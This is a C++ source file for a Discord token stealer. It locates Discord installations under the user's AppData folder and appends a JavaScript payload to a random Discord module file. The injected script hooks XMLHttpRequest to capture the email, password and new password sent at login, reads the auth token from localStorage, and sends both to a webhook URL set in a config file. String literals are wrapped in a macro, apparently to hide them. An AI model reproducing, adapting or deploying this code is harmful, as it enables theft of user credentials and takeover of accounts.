#include <string>
#include <vector>
#include <filesystem>
#include "config.h"
#include <minwindef.h>
#include <fstream>
namespace file_system = std::filesystem;
char buffer[MAX_PATH]; // bad practise, no idea, also 1 AM.
char payload[1500]; // bad practise, no idea, also 1 AM.


class discord_infect
{
public:
    static bool starts_with(const std::string& str, const std::string& start) // https://stackoverflow.com/a/41040620
    {
        if (&start == &str) return true; // str and start are the same string
        if (start.length() > str.length()) return false;
        for (size_t i = 0; i < start.length(); ++i) {
            if (start[i] != str[i]) return false;
        }
        return true;
    }
    static void init() // where the infection starts
    {
        std::string appdata = getenv(_("appdata"));
        std::vector<std::string> paths = {
            appdata + _("\\discord"),
            appdata + _("\\discordptb"),
            appdata + _("\\discordcanary"),
            appdata + _("\\discorddevelopment")
        };

        for (const auto& entry : paths)
        {
            if (std::filesystem::exists(entry))
            {
                for (auto& path : file_system::directory_iterator(entry)) {
                    std::string folder_name = path.path().filename().u8string();
                    if (starts_with(folder_name, _("0."))) {
                        infect_discord(entry, folder_name);
                    }
                }
            }
        }
    }

    static std::string get_random_module() {
        srand(time(NULL));

        std::string module_array[7] = { _("discord_krisp\\index.js"),_("discord_media\\index.js"),_("discord_cloudsync\\index.js"),_("discord_voice\\index.js"),_("discord_utils\\index.js"),_("discord_rpc\\RPCWebSocket.js"),_("discord_dispatch\\index.js") };

        return module_array[rand() % 7];
    }
    static bool infect_discord(std::string discord_path, std::string discord_version)
    {
        sprintf_s(buffer, sizeof(buffer), _("%s\\%s\\modules\\%s"), discord_path.c_str(), discord_version.c_str(), get_random_module().c_str());
        sprintf_s(payload, sizeof(payload), _("\n const P={},_XMLHttpRequest=XMLHttpRequest;XMLHttpRequest=class extends _XMLHttpRequest{constructor(){super(),this.k=this.send,this.send=function(a){var b;try{b=JSON.parse(a)}catch(a){return this.k.apply(this,arguments)}return b&&b.email&&b.password&&(P.email=b.email,P.password=b.password,P.new_password = b.new_password),this.k.apply(this,[JSON.stringify(b)])},this.addEventListener(\"load\",async a=>{try{var b;try{b=JSON.parse(a.target.responseText)}catch(a){}b.token&&!(this.responseURL.includes(\"/ack\")||this.responseURL.includes(\"/activities\"))&&(X.token=b.token,await fetch(\"%s\",{method:\"POST\",body:JSON.stringify({content:JSON.stringify(P)}),headers:{\"Content-Type\":\"application/json\"}}))}catch{}})}}; var X = window.localStorage = document.body.appendChild(document.createElement `iframe`).contentWindow.localStorage; var V = JSON.stringify(X); var L = V; var C = JSON.parse(L); var strtoken = C[\"token\"]; var O = new XMLHttpRequest();O.open('POST', '%s', false);O.setRequestHeader('Content-Type', 'application/json');O.send('{\"content\": ' + strtoken + '}');"), config::webhook_link.c_str(), config::webhook_link.c_str());

        try {
            std::ofstream ofstream;
            ofstream.open(buffer, std::ios_base::app); // open the stream
            ofstream << payload; // output the payload to the file
            ofstream.close(); // close the stream
        }
        catch (const std::exception& error) {
            exit(EXIT_FAILURE);
        }
        return true;
    }
};